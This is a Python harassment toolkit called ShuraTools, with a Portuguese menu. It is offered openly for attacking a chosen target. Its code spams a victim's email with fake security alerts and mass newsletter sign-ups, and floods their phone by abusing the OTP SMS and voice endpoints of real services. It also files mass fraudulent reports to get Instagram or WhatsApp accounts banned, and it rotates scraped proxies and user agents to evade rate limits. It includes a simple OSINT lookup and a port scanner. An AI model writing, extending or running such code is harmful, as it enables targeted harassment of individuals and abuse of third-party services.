#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v5.1 Black-Mamba (High Success Rate)
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install requests faker colorama")
    sys.exit(1)

# Banner ASCII estilizado - SHURA
BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | SMS/Call | Ban | OSINT | Scan <<
{Fore.RED}       v5.1 Black-Mamba - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] ",
        "menu": Fore.CYAN + " > "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Helpers ----------
def safe_int(prompt, default):
    try:
        val = input(prompt)
        if not val: return default
        return int(val)
    except ValueError:
        log(f"Entrada inválida. Usando padrão: {default}", "warn")
        return default

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get(); PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def run_threads(target_func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=target_func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ---------- Database de Endpoints (v5.1 Atualizada) ----------
def get_endpoints(type, target):
    if type == "email_fake":
        return [
            {"url": "https://www.mail-tester.com/contact", "data": {"email": target, "message": f"Olá, detectamos acesso indevido {os.urandom(3).hex()}", "subject": "Alerta de Seguranca"}},
            {"url": "https://www.newsletter.com/subscribe", "data": {"email": target, "action": "subscribe"}},
            {"url": "https://p.newsletter.vtex.com/subscribe", "data": {"email": target, "list": "netshoes"}}
        ]
    elif type == "newsletter":
        return [
            {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", "data": {"action": "tnp", "na": "s", "ne": target, "ny": "on"}},
            {"url": "https://thenewscc.beehiiv.com/create", "data": {"email": target}},
            {"url": "https://thebrief.beehiiv.com/create", "data": {"email": target}},
            {"url": "https://investnews.beehiiv.com/create", "data": {"email": target}},
            {"url": "https://oalgoritmo.substack.com/api/v1/free_signup", "data": {"email": target, "first_url": "https://oalgoritmo.substack.com/"}, "json": True}
        ]
    elif type == "sms_call":
        # Removidos endpoints mortos, mantidos apenas os de alta entrega
        return [
            {"url": "https://www.tiktok.com/api/v1/auth/phone/send_code/", "data": {"mobile": target, "type": 1}, "json": True},
            {"url": "https://auth.ifood.com.br/v1/login/otp", "data": {"phone": target}, "json": True},
            {"url": "https://api.hapi.com/auth/send-code", "data": {"phone": f"+{target}", "channel": "sms"}, "json": True},
            {"url": "https://api.quintoandar.com.br/v3/auth/send-otp", "data": {"phone": target, "method": "VOICE"}, "json": True},
            {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms", "data": {"phone_number": target}, "json": True}
        ]
    return []

# ---------- Attack Engine (Otimizado) ----------
def attack_engine(target, qty, threads, type, use_proxy=False):
    log(f"Iniciando {type.upper()} contra: {target}", "warn")
    endpoints = get_endpoints(type, target)
    if not endpoints:
        log("Nenhum endpoint disponível para este tipo.", "error")
        return

    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                
                # Cabeçalhos inteligentes para cada site
                headers = {
                    "User-Agent": random.choice(UA_LIST),
                    "Accept": "application/json, text/plain, */*",
                    "Referer": site["url"].split("/create")[0] if "/create" in site["url"] else site["url"]
                }
                
                if site.get("json"):
                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=10, proxies=proxies)
                else:
                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                
                if res.status_code in [200, 201, 202, 204]:
                    log(f"Req {i+1} -> SUCESSO via {site['url'].split('/')[2]}", "success")
                else:
                    log(f"Req {i+1} -> Falhou (Status {res.status_code})", "warn")
                
                # Delay randômico para não ser banido pelo IP do alvo
                time.sleep(random.uniform(1.0, 3.0))
            except Exception as e:
                log(f"Req {i+1} -> Erro: Conexão interrompida", "error")
                
    run_threads(job, qty, threads)

# ---------- Outras Ferramentas ----------
def ban_report(target, qty, threads, platform="ig"):
    log(f"Mass Report ({platform.upper()}) -> {target}", "error")
    url = "https://i.instagram.com/api/v1/users/web_report/" if platform == "ig" else "https://v.whatsapp.net/v2/report"
    def job(start, end):
        for i in range(start, end):
            try:
                data = {"username": target, "reason_id": "1"} if platform == "ig" else {"phone": target, "reason": "spam"}
                requests.post(url, data=data, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
                log(f"Report {i+1} enviado.", "success")
            except: pass
    run_threads(job, qty, threads)

# ---------- Menu Principal ----------
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print(f"{Fore.CYAN}[ 1 ] Spam: Mensagens Falsas (E-mail)")
            print(f"{Fore.CYAN}[ 2 ] Spam: Cadastrar Alvo em Newsletters (Sites Chatos)")
            print(f"{Fore.CYAN}[ 3 ] Bomber: SMS & Call (Chamada de Voz)")
            print(f"{Fore.CYAN}[ 4 ] Denuncia: Banir Instagram (Mass Report)")
            print(f"{Fore.CYAN}[ 5 ] Denuncia: Banir WhatsApp (Mass Report)")
            print(f"{Fore.WHITE}[ 6 ] OSINT: Social Profile Search")
            print(f"{Fore.WHITE}[ 7 ] Scan: Port Scanner de Rede")
            print(f"{Fore.YELLOW}[ 8 ] Proxies: Atualizar Lista de Rotação")
            print(f"{Fore.RED}[ 0 ] Sair do ShuraTools")
            print("-" * 55)
            
            opt = input(f"{Fore.YELLOW}Escolha o Arsenal: {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5", "6", "7"]:
                target = input(f"{Fore.YELLOW}Digite o Alvo: {Style.RESET_ALL}").strip()
                if not target: continue
                
                if opt == "1": attack_engine(target, safe_int("Qtd (10): ", 10), 5, "email_fake")
                elif opt == "2": attack_engine(target, safe_int("Qtd (20): ", 20), 5, "newsletter")
                elif opt == "3": attack_engine(target, safe_int("Qtd (15): ", 15), 2, "sms_call")
                elif opt == "4": ban_report(target, safe_int("Qtd (50): ", 50), 10, "ig")
                elif opt == "5": ban_report(target, safe_int("Qtd (50): ", 50), 10, "zap")
                elif opt == "6": 
                    user = target.replace("@", "")
                    for n, u in {"Insta": f"https://ig.me/{user}", "GitHub": f"https://github.com/{user}"}.items():
                        r = requests.get(u, timeout=5)
                        log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'N/F'}", "success" if r.status_code == 200 else "info")
                elif opt == "7":
                    host = target.split("@")[-1] if "@" in target else target
                    try:
                        ip = socket.gethostbyname(host)
                        log(f"IP: {ip}", "info")
                        for p in [80, 443, 8080]:
                            s = socket.socket(); s.settimeout(1.0)
                            if s.connect_ex((ip, p)) == 0: log(f"Porta {p} ABERTA", "success")
                            s.close()
                    except: log("Alvo inacessível.", "error")
                
                input(f"\n{Fore.GREEN}Operação finalizada. ENTER para voltar...{Style.RESET_ALL}")
            elif opt == "8":
                r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all")
                for line in r.text.splitlines():
                    if ":" in line: PROXY_QUEUE.put(line.strip())
                log(f"{PROXY_QUEUE.qsize()} proxies carregadas.", "success"); input("\nENTER...")
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Falha Crítica: {e}", "error"); input("\nENTER para resetar...")

if __name__ == "__main__":
    menu()
